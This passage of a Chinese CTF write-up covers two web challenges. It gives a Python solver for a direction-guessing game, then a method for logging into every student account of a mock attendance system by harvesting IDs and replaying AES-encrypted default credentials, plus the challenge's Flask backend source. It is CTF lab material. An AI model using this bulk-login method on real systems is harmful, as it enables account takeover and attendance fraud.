class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置初始参数</span></span><br><span class="line">session_id = <span class="string">&#x27;b6d4394ee50d789755fa0e582edbaa5e&#x27;</span></span><br><span class="line">base_url = <span class="string">&#x27;http://ip&#x27;</span></span><br><span class="line">get_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>:port/restart&#x27;</span></span><br><span class="line">post_url = <span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span>:port/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义方向映射</span></span><br><span class="line">direction_map = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">&quot;北方&quot;</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">&quot;东北方&quot;</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">&quot;东方&quot;</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="string">&quot;东南方&quot;</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="string">&quot;南方&quot;</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="string">&quot;西南方&quot;</span>,</span><br><span class="line">    <span class="number">7</span>: <span class="string">&quot;西方&quot;</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="string">&quot;西北方&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置公共请求头</span></span><br><span class="line">common_headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;verify=user; PHPSESSID=<span class="subst">&#123;session_id&#125;</span>&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一次发送 GET 请求</span></span><br><span class="line">response_get = session.get(get_url, headers=common_headers)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;GET请求响应:&quot;</span>, response_get.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置 POST 请求的公共头</span></span><br><span class="line">post_headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;ip:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;http://ip:port&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://ip:port/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始 player 和 direct 值</span></span><br><span class="line">player = <span class="number">1</span></span><br><span class="line">direct = <span class="string">&#x27;弟子明白&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送第一次 POST 请求</span></span><br><span class="line">post_data = &#123;<span class="string">&#x27;player&#x27;</span>: player, <span class="string">&#x27;direct&#x27;</span>: direct&#125;</span><br><span class="line">response_post = session.post(post_url, headers=post_headers, data=post_data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;第一次 POST 请求响应:&quot;</span>, response_post.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从响应中提取数字列表</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_numbers_from_response</span>(<span class="params">response_text</span>):</span><br><span class="line">    <span class="keyword">match</span> = re.search(<span class="string">r&#x27;us&quot;&gt;(.*)&lt;/h&#x27;</span>, response_text,re.DOTALL)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="keyword">match</span>.group(<span class="number">1</span>).replace(<span class="string">&quot;&lt;/h1&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/body&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).strip().split(<span class="string">&#x27;,&#x27;</span>))</span><br><span class="line">        <span class="comment"># 提取并处理数字</span></span><br><span class="line">        numbers = <span class="keyword">match</span>.group(<span class="number">1</span>).replace(<span class="string">&quot;&lt;/h1&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;&lt;/body&gt;&quot;</span>,<span class="string">&quot;&quot;</span>).strip().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> [<span class="built_in">int</span>(num.strip()) <span class="keyword">for</span> num <span class="keyword">in</span> numbers <span class="keyword">if</span> num.strip().isdigit()]</span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 循环五次</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    <span class="comment"># 提取数字列表</span></span><br><span class="line">    number_list = extract_numbers_from_response(response_post.text)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(number_list) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没有找到有效的数字。&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据数字列表设置 direct</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(number_list) == <span class="number">1</span>:</span><br><span class="line">        <span class="comment"># 只有一个方向</span></span><br><span class="line">        direction_index = number_list[<span class="number">0</span>]</span><br><span class="line">        direct = direction_map.get(direction_index, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># 多个方向</span></span><br><span class="line">        s=<span class="number">0</span></span><br><span class="line">        directions = [direction_map.get(num) <span class="keyword">for</span> num <span class="keyword">in</span> number_list <span class="keyword">if</span> num <span class="keyword">in</span> direction_map]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(directions)):</span><br><span class="line">            directions[i]=directions[i]+<span class="string">&quot;一个&quot;</span></span><br><span class="line">        direct=<span class="string">&quot;，&quot;</span>.join(directions)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 发送下一个 POST 请求</span></span><br><span class="line">    post_data = &#123;<span class="string">&#x27;player&#x27;</span>: player, <span class="string">&#x27;direct&#x27;</span>: direct&#125;</span><br><span class="line">    response_post = session.post(post_url, headers=post_headers, data=post_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;POST 请求 <span class="subst">&#123;direct&#125;</span> 响应:&quot;</span>, response_post.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>唯一需要提醒的，这里从“弟子明白”开始就必须启用一个会话发送post，这样才会被认定为是“同一个弟子”在“听声辩位”，否则返回“你是上来捣乱的吧”</p><p>重点就在于根据服务器返回的页面准确识别到数字，对应成方向再发送出去</p><h2 id="Re-从零开始的-XDU-教书生活"><a href="#Re-从零开始的-XDU-教书生活" class="headerlink" title="Re: 从零开始的 XDU 教书生活"></a><strong>Re: 从零开始的 XDU 教书生活</strong></h2><p>明确一下我们需要做的事情首先我们要签到而不是代签，那我们要登陆所有学生的账号，在此状态下扫描二维码，也就是在这个会话之下get请求二维码的连接；另外我们不能放着老师的账号一直登陆，否则二维码将自动刷新；</p><p>首先我们要获得所有学生的账号，那就登录老师账号，f12控制台console我们可以找到所有学生账号，不过有重复，要去重；</p><p><img src="/2024/10/13/moectf2024-web%E6%96%B9%E5%90%91wp/re1.png" alt="re1"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取文件并处理数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;nums&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去除非数字的行并转换为集合</span></span><br><span class="line">numbers_set = &#123;line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> lines <span class="keyword">if</span> line.strip().isdigit()&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算集合长度</span></span><br><span class="line">length = <span class="built_in">len</span>(numbers_set)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;集合长度: <span class="subst">&#123;length&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将集合元素输出到新的文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> output_file:</span><br><span class="line">    <span class="keyword">for</span> number <span class="keyword">in</span> numbers_set:</span><br><span class="line">        output_file.write(number + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>确定学生总数没错后，我们就可以将其作为账号密码了</p><p>另外要注意，抓包后会发现，登陆的时候会把原始的账号密码用AES加密，所以我们自己发送请求也要这么操作才可以，密钥和iv都在后端源码</p><p>网页后端源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, jsonify, abort, make_response, redirect</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, timedelta, timezone</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;TEMPLATES_AUTO_RELOAD&quot;</span>] = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">status = &#123;<span class="number">0</span>: <span class="string">&quot;缺勤(未参与)&quot;</span>, <span class="number">1</span>: <span class="string">&quot;签到成功&quot;</span>, <span class="number">2</span>: <span class="string">&quot;教师代签&quot;</span>, <span class="number">5</span>: <span class="string">&quot;缺勤&quot;</span>, <span class="number">7</span>: <span class="string">&quot;病假&quot;</span>, <span class="number">8</span>: <span class="string">&quot;事假&quot;</span>, <span class="number">9</span>: <span class="string">&quot;迟到&quot;</span>, <span class="number">10</span>: <span class="string">&quot;早退&quot;</span>, <span class="number">11</span>: <span class="string">&quot;过期&quot;</span>, <span class="number">12</span>: <span class="string">&quot;公假&quot;</span>, <span class="number">39331</span>: <span class="string">&quot;实习&quot;</span>, <span class="number">39332</span>: <span class="string">&quot;实训&quot;</span>, <span class="number">39333</span>: <span class="string">&quot;免修&quot;</span>, <span class="number">39334</span>: <span class="string">&quot;参赛&quot;</span>&#125;</span><br><span class="line">teacher_phone = <span class="string">&quot;10000&quot;</span></span><br><span class="line">user_pwd = &#123;<span class="string">&quot;10000&quot;</span>: <span class="string">&quot;10000&quot;</span>&#125;</span><br><span class="line">token_user = &#123;&#125;</span><br><span class="line">sign_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params"><span class="built_in">min</span>: <span class="built_in">int</span>, <span class="built_in">max</span>: <span class="built_in">int</span>, num: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &lt; num:</span><br><span class="line">        x = <span class="built_in">str</span>(random.randint(<span class="built_in">min</span>, <span class="built_in">max</span>))</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> user_pwd:</span><br><span class="line">            user_pwd[x] = x</span><br><span class="line">            sign_list.append(&#123;<span class="string">&quot;uid&quot;</span>: <span class="built_in">int</span>(x), <span class="string">&quot;name&quot;</span>: x, <span class="string">&quot;status&quot;</span>: <span class="number">0</span>&#125;)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_current_time</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> datetime.now(timezone(timedelta(hours=<span class="number">8</span>))).strftime(<span class="string">&quot;%Y-%m-%dT%H:%M:%S.%f&quot;</span>)[:-<span class="number">3</span>] + <span class="string">&quot;+08:00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_current_timestamp</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(datetime.now().timestamp() * <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_by_aes</span>(<span class="params">encrypted: <span class="built_in">str</span>, key: <span class="built_in">str</span>, iv: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    key_bytes = key.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    iv_bytes = iv.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    encrypted_bytes = base64.b64decode(encrypted)</span><br><span class="line">    decrypted_bytes = cipher.decrypt(encrypted_bytes)</span><br><span class="line">    pad = decrypted_bytes[-<span class="number">1</span>]</span><br><span class="line">    decrypted_bytes = decrypted_bytes[:-pad]</span><br><span class="line">    decrypted = decrypted_bytes.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> decrypted</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_credentials</span>(<span class="params">phone: <span class="built_in">str</span>, password: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">return</span> phone <span class="keyword">in</span> user_pwd <span class="keyword">and</span> user_pwd[phone] == password</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    flag = os.getenv(<span class="string">&quot;FLAG&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        flag = <span class="string">&quot;The FLAG environment variable is not set. If you see this in the remote container, plaese restart the service. If you see this in the local container, please set the FLAG environment variable.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line">start_time = get_current_time()</span><br><span class="line">start_timestamp = get_current_timestamp()</span><br><span class="line">time_long = -<span class="number">1</span></span><br><span class="line">active_status = <span class="number">1</span></span><br><span class="line">active_id = <span class="number">4000000000000</span></span><br><span class="line">sign_code = <span class="literal">None</span></span><br><span class="line">enc = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> token <span class="keyword">not</span> <span class="keyword">in</span> token_user:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token_user[token] == teacher_phone:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/widget/sign/pcTeaSignController/showSignInfo&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/page/sign/signIn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/sign/pcTeaSignController/showSignInfo&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showSignInfo</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;showSignInfo.html&quot;</span>, start_time=start_time, current_time=get_current_time(), time_long=time_long, time_long_2=<span class="number">0</span>, active_id = active_id)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language_zh_CN.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language_zh_CN</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language_zh_CN.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language_zh_TW.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language_zh_TW</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language_zh_TW.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language_en_US.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language_en_US</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language_en_US.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language_th_TH.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language_th_TH</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language_th_TH.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/properties/language_lo_LA.properties&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language_lo_LA</span>():</span><br><span class="line">    <span class="keyword">return</span> app.send_static_file(<span class="string">&quot;language_lo_LA.properties&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/widget/sign/pcTeaSignController/updateSignStatus2&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_sign_status</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> token <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> token <span class="keyword">not</span> <span class="keyword">in</span> token_user <span class="keyword">or</span> token_user[token] != teacher_phone:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;result&quot;</span>: <span class="number">0</span>, <span class="string">&quot;msg&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;errorMsg&quot;</span>: <span class="string">&quot;当前登录的账号不是教师，无法修改签到状态。&quot;</span>&#125;</span><br><span class="line">    uid_and_aid = request.form.get(<span class="string">&quot;uidAndAid&quot;</span>).split(<span class="string">&quot;_&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(uid_and_aid) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: <span class="number">0</span>, <span class="string">&quot;msg&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;data&quot;</span>: <span class="literal">None</span>, <span class="string">&quot;errorMsg&quot;</span>: <span class="string">&quot;Invalid arguments.&quot;</span>&#125;)</span><br><span class="line">    </span><br><span class="line">    uid = <span class="built_in">int</span>(uid_and_aid[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;parseUID <span class="subst">&#123;uid&#125;</span>&quot;</span>)</span><br><span class="line">    status = <span class="built_in">int</span>(request.form.get(<span class="string">&quot;status&quot;</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sign_list:</span><br><span class="line">        <span class="keyword">if</span> i[<span class="string">&quot;uid&quot;</span>] == uid:</span><br><span class="line">            i[<span class="string">&quot;status&quot;</span>] = status</span><br><span class="line">            <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;result&quot;</span>: <span class="number">1</span>, <span 